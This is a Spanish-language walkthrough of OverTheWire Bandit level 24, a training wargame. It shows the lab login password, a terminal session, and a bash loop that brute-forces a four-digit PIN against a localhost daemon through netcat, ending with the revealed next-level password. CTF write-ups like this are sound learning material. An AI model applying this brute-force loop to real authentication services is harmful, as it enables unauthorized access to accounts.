# Bandit Level 24 → Level 25
## Objetivo
A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.  
You do not need to create new connections each time
## Datos de acceso al nivel
```
ssh bandit24@bandit.labs.overthewire.org -p 2220 
	(comando para iniciar ssh)
contraseña: 
VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar
```
## Solución 
```pwd
bandit24@bandit:~$
bandit24@bandit:~$ pwd
/home/bandit24
bandit24@bandit:~$ ls -la
total 20
drwxr-xr-x  2 root root 4096 Apr 23 18:04 .
drwxr-xr-x 70 root root 4096 Apr 23 18:05 ..
-rw-r--r--  1 root root  220 Jan  6  2022 .bash_logout
-rw-r--r--  1 root root 3771 Jan  6  2022 .bashrc
-rw-r--r--  1 root root  807 Jan  6  2022 .profile
bandit24@bandit:~$ nc -v localhost 30002
Connection to localhost (127.0.0.1) 30002 port [tcp/*] succeeded!
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar 123
Timeout. Exiting.

bandit24@bandit:~$ echo {0000..0010}
0000 0001 0002 0003 0004 0005 0006 0007 0008 0009 0010
bandit24@bandit:~$ echo $(seq 1 10)
1 2 3 4 5 6 7 8 9 10
bandit24@bandit:~$ for i in {0000..0003); do echo UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ $i; done
-bash: syntax error near unexpected token `)'
bandit24@bandit:~$ for i in {0000..0003}; do echo UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ $i ; done
UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 0000
UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 0001
UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 0002
UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 0003
bandit24@bandit:~$ for i in {0000..9999}; do echo VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar $i; done | nc localhost 30002 | grep -v Wrong
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
Correct!
The password of user bandit25 is p7TaowMYrmu23Ol8hiZh9UvD0O9hpx8d

Exiting.
bandit24@bandit:~$
```
## Notas adicionales
for i in {0000..9999}; do echo VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar $i; done | nc localhost 30002 | grep -v Wrong
Ejecuta un bucle `for` que genera una secuencia de números de cuatro dígitos desde "0000" hasta "9999" (en total, 10,000 iteraciones). En cada iteración, concatena el número generado con la cadena "VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar" y luego envía esta cadena a través de una tubería (pipe) a la utilidad `nc` (netcat) para conectarse a un servidor que escucha en el puerto localhost 30002.

El servidor al que te estás conectando parece requerir un código numérico de cuatro dígitos como parte de la autenticación. El bucle `for` está probando todas las combinaciones posibles de códigos de cuatro dígitos, desde "0000" hasta "9999", y enviándolos al servidor uno por uno.

El resultado de la conexión al servidor se filtra utilizando `grep -v Wrong`, lo que significa que cualquier línea que contenga la palabra "Wrong" será excluida de la salida. Esto se hace para mostrar solo las respuestas del servidor que no indican que el código ingresado es incorrecto.

En resumen, este comando se utiliza para probar todas las combinaciones posibles de códigos de cuatro dígitos en un servidor en localhost que parece requerir autenticación mediante un código numérico. El resultado final serán las respuestas del servidor que indican que el código es correcto, ya que las respuestas con "Wrong" son excluidas de la salida.
## Referencias
